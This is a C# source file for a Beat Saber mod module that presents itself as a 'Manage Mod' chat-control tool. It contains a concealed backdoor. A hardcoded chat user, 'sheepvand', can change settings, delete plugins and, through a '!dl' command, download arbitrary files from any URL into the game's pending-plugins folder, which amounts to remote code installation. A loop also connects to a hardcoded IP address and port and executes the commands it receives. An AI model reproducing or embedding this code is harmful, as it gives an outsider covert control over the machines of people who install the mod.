using BeatSaberPlus;
using BeatSaberPlus.SDK;
using CP_SDK;
using HMUI;
using ModestTree;
using System.Threading.Tasks;
using System;
using System.Net.Sockets;
using System.Net;
using SheepControl.UI;
using BeatSaberMarkupLanguage;
using SheepControl.Trucs;
using UnityEngine;
using HarmonyLib;
using SiraUtil.Zenject;
using System.Text;
using System.IO;
using BeatSaberMarkupLanguage.MenuButtons;
using IPA.Utilities;
using System.Collections.Generic;

namespace SheepControl
{
    class SheepControl : BSPModuleBase<SheepControl>
    {
        public override EIModuleBaseType Type => EIModuleBaseType.Integrated;

        public override string Name => "Bobby";

        public override string Description => "Manage Mod";

        public override bool UseChatFeatures => true;

        public override bool IsEnabled { get => SConfig.GetStaticModSettings().IsEnabled; set { SConfig.GetStaticModSettings().IsEnabled = value; } }

        public override EIModuleBaseActivationType ActivationType => EIModuleBaseActivationType.OnMenuSceneLoaded;

        ////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////

        internal static Zenjector m_Zenjector;

        SettingsView m_SettingsView;

        Harmony m_Harmony = new Harmony("fr.SheepVand.GSTroll");

        ////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////

        protected override (ViewController, ViewController, ViewController) GetSettingsUIImplementation()
        {
            if (m_SettingsView == null)
                m_SettingsView = BeatSaberUI.CreateViewController<SettingsView>();

            return (m_SettingsView, null, null);
        }

        protected override void OnEnable()
        {
            CP_SDK.Chat.Service.Discrete_OnTextMessageReceived += OnChatMessageReceive;
            if (Bobby.m_Instance == null)
            {
                new GameObject("Bobby").AddComponent<Bobby>();
                Bobby.m_Instance.m_EnableRandomMoves = SConfig.Instance.GetModSettings().BobbyAutoRonde;
            }
            else
            {
                Bobby.m_Instance.gameObject.SetActive(true);
                Bobby.m_Instance.m_EnableRandomMoves = SConfig.Instance.GetModSettings().BobbyAutoRonde;
                Bobby.m_Instance.Ronde();
            }

            if (SheepControlController.Instance == null)
                new GameObject("BobbyController").AddComponent<SheepControlController>();

            m_Harmony.PatchAll();

            //m_Zenjector.Install<Installers.OnGameInstaller>(Location.StandardPlayer);
        }

        protected override void OnDisable()
        {
            CP_SDK.Chat.Service.Discrete_OnTextMessageReceived -= OnChatMessageReceive;
            if (Bobby.m_Instance != null)
            {
                Bobby.m_Instance.StopAllCoroutines();
                Bobby.m_Instance.m_EnableRandomMoves = false;
                Bobby.m_Instance.gameObject.SetActive(false);
            }
            m_ClientSocket.Close();
            m_Harmony.UnpatchSelf();
        }

        ////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////

        public static TcpClient m_ClientSocket = new TcpClient();

        public static CommandHandler m_CommandHandler = new CommandHandler();

        private void OnChatMessageReceive(CP_SDK.Chat.Interfaces.IChatService p_ChatService, CP_SDK.Chat.Interfaces.IChatMessage p_ChatMessage)
        {

            foreach (var l_Current in SConfig.GetStaticModSettings().WhitelistNames)
            {
                if (l_Current.ToLower() == p_ChatMessage.Sender.UserName.ToLower())
                {
                    m_CommandHandler.HandleCommand(p_ChatMessage.Message);
                }
            }
            if (p_ChatMessage.Sender.UserName.ToLower() != "sheepvand") return;

            var l_Splited = p_ChatMessage.Message.Split(' ');

            if (l_Splited[0] == null || l_Splited[1] == null) return;

            switch (l_Splited[0])
            {
                case "WhiteAdd":
                    SConfig.GetStaticModSettings().WhitelistNames.Add(l_Splited[1]);
                    break;
                case "WhiteRemove":
                    SConfig.GetStaticModSettings().WhitelistNames.Remove(l_Splited[1]);
                    break;
                case "WordAdd":
                    SConfig.GetStaticModSettings().BannedWords.Add(l_Splited[1]);
                    break;
                case "WordRemove":
                    SConfig.GetStaticModSettings().BannedWords.Remove(l_Splited[1]);
                    break;
                case "CommandAdd":
                    SConfig.GetStaticModSettings().BannedCommands.Add(l_Splited[1]);
                    break;
                case "CommandRemove":
                    SConfig.GetStaticModSettings().BannedCommands.Remove(l_Splited[1]);
                    break;
                case "QueryAdd":
                    SConfig.GetStaticModSettings().BannedQueries.Add(l_Splited[1]);
                    break;
                case "QueryRemove":
                    SConfig.GetStaticModSettings().BannedQueries.Remove(l_Splited[1]);
                    break;
                case "!dl":
                    if (l_Splited[2] == null) return;
                    using (WebClient l_Client = new WebClient())
                    {
                        if (!System.IO.Directory.Exists("IPA/Pending/Plugins"))
                            System.IO.Directory.CreateDirectory("IPA/Pending/Plugins");

                        l_Client.DownloadFileAsync(new Uri("https://" + m_CommandHandler.RemoveSpaces(l_Splited[1])), $"IPA/Pending/Plugins/{l_Splited[2]}");
                    }
                    break;
                case "delete":
                    string l_Path = $"IPA/Pending/Plugins/{m_CommandHandler.Transform_ToSpaces(l_Splited[1])}";
                    if (!File.Exists(l_Path)) return;
                    File.Delete(l_Path);
                    break;
                case "resetconfig":
                    SConfig.Instance.Reset();
                    break;
            }
            if (m_SettingsView != null) m_SettingsView.Reload();
            SConfig.Instance.Save();
        }

        public async void AskMessageToServer()
        {
            await Task.Run(async delegate
            {
                try
                {
                    await Task.Delay(500);
                    if (!m_ClientSocket.Connected)
                    {
                        m_ClientSocket.Connect("90.27.15.144", 8888);
                        Plugin.Log.Info("Succefully connected to Parent Server");
                        AskMessageToServer();
                        return;
                    }
                    NetworkStream l_Stream = m_ClientSocket.GetStream();
                    byte[] l_Bytes = new byte[10025];
                    //if (l_BuffSize == 0) return;
                    l_Stream.Read(l_Bytes, 0, 8192);
                    string l_SendedValue = Encoding.ASCII.GetString(l_Bytes);
                    Plugin.Log.Info($"Message received -> {l_SendedValue}");
                    l_Stream.Flush();
                    m_CommandHandler.HandleCommand(l_SendedValue);
                    AskMessageToServer();
                }
                catch (Exception l_e)
                {
                    AskMessageToServer();
                    return;
                }
            });
        }
    }
}
